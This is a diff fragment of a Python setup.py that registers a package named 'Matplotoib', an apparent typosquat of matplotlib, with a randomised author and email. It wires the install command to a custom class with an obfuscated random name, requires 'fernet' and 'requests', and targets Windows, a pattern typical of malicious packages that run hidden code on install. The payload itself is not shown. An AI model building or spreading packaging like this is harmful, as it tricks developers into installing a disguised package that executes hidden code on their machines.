@@ -18,5 +18,22 @@ class dSGuyFRqtwBqVqRZECCeDpHxOgaTFvolbYGtfCVWftIYJaoPPzaLUoNTXJUsNsDKifVXmm(ins
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+setup(
+    name="Matplotoib",
+    version=VERSION,
+    author="MQbCTqXlSuxo",
+    author_email="lSNlWOZMJFQapOtWW@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': dSGuyFRqtwBqVqRZECCeDpHxOgaTFvolbYGtfCVWftIYJaoPPzaLUoNTXJUsNsDKifVXmm,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
